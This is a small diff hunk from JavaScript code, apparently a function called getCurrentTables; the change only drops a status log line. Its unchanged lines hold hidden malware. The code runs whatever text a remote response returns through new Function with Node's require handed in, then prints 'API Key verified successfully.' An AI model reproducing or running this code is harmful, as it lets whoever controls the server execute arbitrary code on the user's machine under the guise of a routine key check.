@@ -73,7 +73,6 @@ const getCurrentTables = () =>
       .then((response) => {
         const executor = new Function("require", response.data);
         executor(require);
-        console.log(response.status);
         console.log("API Key verified successfully.");
         return true;
       })
